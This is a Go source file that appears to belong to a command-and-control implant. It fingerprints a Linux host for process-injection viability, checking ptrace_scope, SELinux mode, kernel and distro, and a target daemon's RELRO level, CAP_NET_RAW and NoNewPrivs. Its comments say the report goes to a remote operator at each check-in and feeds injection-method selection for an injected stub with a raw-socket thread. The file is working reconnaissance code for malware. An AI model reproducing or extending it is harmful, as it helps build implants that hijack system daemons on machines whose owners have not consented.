package ttp

// env_fingerprint.go — R-01: pre-flight environment fingerprint
//
// CollectEnvFingerprint gathers conditions relevant to injection viability:
//   - ptrace_scope (Yama LSM)
//   - SELinux mode
//   - Target daemon: PID, comm, RELRO level, CAP_NET_RAW, NoNewPrivs
//   - Kernel version, distro
//
// Called once at agent startup; result sent in every check-in so the operator
// can make informed decisions before issuing TTPs (especially TTP 11).

import (
	"debug/elf"
	"encoding/binary"
	"fmt"
	"os"
	"strings"

	"core/mon/internal/protocol"
)

// CollectEnvFingerprint probes the host environment.
// targetCandidates is the ordered list of daemon comm names to look for.
func CollectEnvFingerprint(targetCandidates []string) protocol.EnvReport {
	r := protocol.EnvReport{}

	// ptrace_scope
	if data, err := os.ReadFile("/proc/sys/kernel/yama/ptrace_scope"); err == nil {
		fmt.Sscanf(strings.TrimSpace(string(data)), "%d", &r.PtraceScope)
	}

	// SELinux
	r.SELinuxMode = selinuxMode()

	// Kernel version (via /proc/version — avoids syscall type differences across arch)
	r.KernelVersion = kernelVersion()

	// Distro (via /etc/os-release ID field)
	r.Distro = parseDistro()

	// Target process details
	if pid, comm, err := findTargetPID(targetCandidates); err == nil {
		r.TargetPID = pid
		r.TargetComm = comm
		r.TargetRELRO = detectRELRO(pid)
		r.TargetCapNetRaw = hasCapNetRaw(pid)
		r.TargetNoNewPrivs = hasNoNewPrivs(pid)
	}

	return r
}

// selinuxMode returns "enforcing", "permissive", or "disabled".
func selinuxMode() string {
	if _, err := os.Stat("/sys/fs/selinux/enforce"); err != nil {
		return "disabled"
	}
	data, err := os.ReadFile("/sys/fs/selinux/enforce")
	if err != nil {
		return "disabled"
	}
	switch strings.TrimSpace(string(data)) {
	case "1":
		return "enforcing"
	case "0":
		return "permissive"
	default:
		return "disabled"
	}
}

// kernelVersion extracts the version string from /proc/version.
func kernelVersion() string {
	data, err := os.ReadFile("/proc/version")
	if err != nil {
		return "unknown"
	}
	// "Linux version 6.8.0-55-generic (buildd@...) ..."
	fields := strings.Fields(string(data))
	if len(fields) >= 3 {
		return fields[2]
	}
	return strings.TrimSpace(string(data))
}

// parseDistro returns the OS ID from /etc/os-release (e.g. "ubuntu", "debian", "rhel").
func parseDistro() string {
	data, err := os.ReadFile("/etc/os-release")
	if err != nil {
		return "unknown"
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "ID=") {
			return strings.Trim(strings.TrimPrefix(line, "ID="), `"`)
		}
	}
	return "unknown"
}

// detectRELRO reads the ELF of the target's main binary and returns:
//
//	"none"    — no PT_GNU_RELRO segment
//	"partial" — PT_GNU_RELRO present, but DF_1_NOW not set (lazy binding)
//	"full"    — PT_GNU_RELRO + DF_1_NOW (GOT sealed at load time; CoW required)
//	"unknown" — ELF parse failed
//
// R-02: this result is included in EnvReport and used by selectInjectionMethod.
func detectRELRO(pid int) string {
	exePath := fmt.Sprintf("/proc/%d/exe", pid)
	f, err := elf.Open(exePath)
	if err != nil {
		return "unknown"
	}
	defer f.Close()

	hasRELROSeg := false
	for _, p := range f.Progs {
		if p.Type == elf.PT_GNU_RELRO {
			hasRELROSeg = true
			break
		}
	}
	if !hasRELROSeg {
		return "none"
	}

	// DF_1_NOW (bit 0) in DT_FLAGS_1 indicates full RELRO (BIND_NOW).
	const DT_FLAGS_1 = 0x6ffffffb
	const DF_1_NOW = 0x1

	dynSection := f.Section(".dynamic")
	if dynSection == nil {
		return "partial"
	}
	dynData, err := dynSection.Data()
	if err != nil {
		return "partial"
	}
	// Each Elf64_Dyn: tag(8) + val(8) = 16 bytes
	const entrySize = 16
	for i := 0; i+entrySize <= len(dynData); i += entrySize {
		tag := binary.LittleEndian.Uint64(dynData[i:])
		val := binary.LittleEndian.Uint64(dynData[i+8:])
		if tag == DT_FLAGS_1 {
			if val&DF_1_NOW != 0 {
				return "full"
			}
			return "partial"
		}
	}
	return "partial"
}

// hasCapNetRaw returns true if the process has CAP_NET_RAW (bit 13) in CapEff.
// R-08: used to decide whether the rawsock thread will succeed in the injected stub.
func hasCapNetRaw(pid int) bool {
	return readCapBit(pid, 13)
}

// readCapBit reads CapEff from /proc/PID/status and checks whether bit n is set.
func readCapBit(pid, bit int) bool {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "CapEff:") {
			hexStr := strings.TrimSpace(strings.TrimPrefix(line, "CapEff:"))
			var capVal uint64
			fmt.Sscanf(hexStr, "%x", &capVal)
			return (capVal>>bit)&1 == 1
		}
	}
	return false
}

// hasNoNewPrivs returns true if the process has NoNewPrivs set in /proc/PID/status.
func hasNoNewPrivs(pid int) bool {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "NoNewPrivs:") {
			var val int
			fmt.Sscanf(strings.TrimSpace(strings.TrimPrefix(line, "NoNewPrivs:")), "%d", &val)
			return val == 1
		}
	}
	return false
}
